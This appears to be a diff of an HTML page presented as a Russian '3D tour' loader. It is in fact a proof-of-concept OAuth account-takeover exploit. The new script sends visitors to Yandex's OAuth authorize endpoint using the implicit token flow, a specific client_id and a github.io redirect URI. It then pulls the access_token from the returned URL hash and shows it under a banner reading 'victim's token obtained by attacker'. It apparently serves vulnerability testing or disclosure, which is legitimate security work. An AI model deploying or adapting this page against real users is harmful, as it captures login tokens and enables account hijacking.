@@ -1,10 +1,35 @@
 <!DOCTYPE html>
 <html lang="ru"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
 <title>3D-тур</title>
-<style>body{margin:0;font-family:system-ui;background:#101418;color:#e8eaed;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh}
-.s{width:54px;height:54px;border:5px solid #2b3138;border-top-color:#fc0;border-radius:50%;animation:r 1s linear infinite;margin-bottom:20px}
-@keyframes r{to{transform:rotate(360deg)}}</style></head>
-<body><div class="s"></div><h1>3D-тур загружается…</h1>
-<p>CVP-NAV-TEST → passport</p>
-<script>document.title='CVP-TOUR-LOADED';setTimeout(function(){location.href='https://passport.yandex.ru/profile';},2500);</script>
+<style>
+body{margin:0;font-family:system-ui;background:#101418;color:#e8eaed;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center;padding:16px}
+.s{width:50px;height:50px;border:5px solid #2b3138;border-top-color:#fc0;border-radius:50%;animation:r 1s linear infinite;margin-bottom:18px}
+@keyframes r{to{transform:rotate(360deg)}}
+h1{font-size:18px;margin:0 0 8px;font-weight:600}
+p{font-size:12px;color:#9aa0a6;margin:4px 0;word-break:break-all}
+.tok{font-size:11px;color:#fc0;word-break:break-all;max-width:92%}
+.ok{color:#0f0;font-weight:700}
+</style></head>
+<body>
+<div class="s" id="spin"></div>
+<h1 id="h">3D-тур загружается…</h1>
+<p>CVP-ATO-TEST</p>
+<p id="out"></p>
+<script>
+document.title='CVP-TOUR-LOADED';
+var h=location.hash||'';
+if(h.indexOf('access_token')>-1){
+  document.getElementById('spin').style.display='none';
+  document.getElementById('h').innerHTML='<span class="ok">ТОКЕН ЖЕРТВЫ ПОЛУЧЕН АТАКУЮЩИМ</span>';
+  document.getElementById('out').className='tok';
+  document.getElementById('out').textContent='CVP-ATO '+(h.match(/access_token=[^&]+/)||['?'])[0];
+  document.title='CVP-ATO-OWNED';
+}else if(h.indexOf('error')>-1){
+  document.getElementById('h').textContent='ошибка: '+h;
+}else{
+  setTimeout(function(){
+    location.href='https://oauth.yandex.ru/authorize?response_type=token&client_id=760256e188e74232a49508aaf32c9ec5&redirect_uri='+encodeURIComponent('https://hgivtujcgjv.github.io/realty-tour-poc/');
+  },2500);
+}
+</script>
 </body></html>
